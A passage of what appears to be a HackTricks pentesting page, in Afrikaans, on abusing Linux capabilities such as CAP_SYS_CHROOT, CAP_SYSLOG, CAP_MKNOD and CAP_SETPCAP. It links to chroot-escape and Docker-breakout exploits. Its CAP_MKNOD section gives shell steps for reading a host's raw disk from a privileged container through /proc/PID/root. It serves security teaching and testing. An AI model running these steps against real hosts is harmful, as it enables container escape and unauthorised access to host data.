Die `FS_IOC_GETFLAGS`- en `FS_IOC_SETFLAGS`-bewerkings lees en werk inode-vlae by; `FS_IMMUTABLE_FL` is die onveranderlike vlag wat deur hierdie voorbeeld verwyder word.<sup>[[27]](#references)</sup>

> [!TIP]
> Let daarop dat hierdie onveranderlike attribuut gewoonlik met die volgende gestel en verwyder word:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) maak die uitvoering van die `chroot(2)`-stelseloproep moontlik, wat potensieel die ontsnapping uit `chroot(2)`-omgewings deur bekende kwesbaarhede kan toelaat.<sup>[[11]](#references)[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) laat die uitvoering van die `reboot(2)`-stelseloproep vir stelselherbeginne toe, insluitend opdragte soos `LINUX_REBOOT_CMD_RESTART2`; dit aktiveer ook `kexec_load(2)` en, vanaf Linux 3.17, `kexec_file_load(2)` om onderskeidelik nuwe of ondertekende crash kernels te laai.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is in Linux 2.6.37 van die breër **CAP_SYS_ADMIN** geskei, en verleen spesifiek die vermoë om die `syslog(2)`-oproep te gebruik. Hierdie capability maak dit moontlik om kerneladresse deur `/proc` en soortgelyke koppelvlakke te sien wanneer die `kptr_restrict`-instelling op 1 gestel is, wat die blootstelling van kerneladresse beheer. Sedert Linux 2.6.39 is die verstekwaarde vir `kptr_restrict` 0, wat beteken dat kerneladresse blootgestel word, hoewel baie distributions dit om sekuriteitsredes op 1 stel (verberg adresse behalwe vir uid 0) of op 2 (verberg adresse altyd).<sup>[[14]](#references)</sup>

Daarbenewens laat **CAP_SYSLOG** toegang tot `dmesg`-uitset toe wanneer `dmesg_restrict` op 1 gestel is. Ten spyte van hierdie veranderinge behou **CAP_SYS_ADMIN** die vermoë om `syslog`-bewerkings uit te voer weens historiese presedente.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod`-stelseloproep verder uit as die skep van gewone lêers, FIFOs (benoemde pype) of UNIX-domeinsokke. Dit laat spesifiek die skep van spesiale lêers toe, insluitend:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Karakter-spesiale lêers, wat toestelle soos terminale is.
- **S_IFBLK**: Blok-spesiale lêers, wat toestelle soos skywe is.

Hierdie capability is nuttig vir prosesse wat toestellêers moet skep, insluitend karakter- of bloktoestelle.<sup>[[14]](#references)</sup>

Dit is ingesluit in Docker se gedokumenteerde verstek-capability-stel; verifieer die werklike runtime-konfigurasie eerder as om aan te neem dat elke deployment dieselfde verstekwaardes gebruik ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Hierdie capability maak privilege escalations (deur volledige skyfleeswerk) op die host moontlik, onder die volgende voorwaardes:<sup>[[7]](#references)</sup>

1. Het aanvanklike toegang tot die host (Unprivileged).
2. Het aanvanklike toegang tot die container (Privileged (EUID 0), en effektiewe `CAP_MKNOD`).
3. Die host en container moet dieselfde user namespace deel.

**Stappe om ’n bloktoestel in ’n container te skep en toegang daartoe te verkry:**

1. **Op die host as ’n standaardgebruiker:**

- Bepaal jou huidige user ID met `id`, byvoorbeeld, `uid=1000(standarduser)`.
- Identifiseer die teikentoestel, byvoorbeeld `/dev/sdb`.

2. **Binne die container as `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Terug op die Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Hierdie benadering laat die standaardgebruiker toe om toegang tot en moontlik data vanaf `/dev/sdb` deur die container te lees wanneer die device, namespaces en permissions soos beskryf gekonfigureer is.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Op huidige Linux-kernels met file capabilities laat **`CAP_SETPCAP`** ’n thread toe om capabilities vanaf sy bounding set by sy inheritable set te voeg, capabilities uit sy bounding set te verwyder en sy securebits te verander. Dit laat ’n process nie toe om arbitrêr capabilities aan ’n ander process toe te ken nie; daardie gedrag geld slegs vir pre-2.6.25-kernels sonder file-capability support.<sup>[[14]](#references)</sup>

Die `capset()` system call kan ’n thread se eie effective, permitted en inheritable sets aanpas, maar die nuwe permitted set mag nie capabilities bevat wat buite die bestaande permitted set val nie, en inheritable updates bly onderhewig aan kernel constraints.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation-laboratoriums](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Basics: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Misbruik van toegang tot mount namespaces deur /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Waarom Hulle Bestaan en Hoe Hulle Werk](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Verstaan Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC vir die omseiling van seccomp as ptrace toegelaat word](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Hoe om uit verskeie chroot-oplossings te ontsnap](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - oorspronklike CAP_DAC_READ_SEARCH Docker breakout exploit deur Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Ontleding van Docker breakout exploit](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
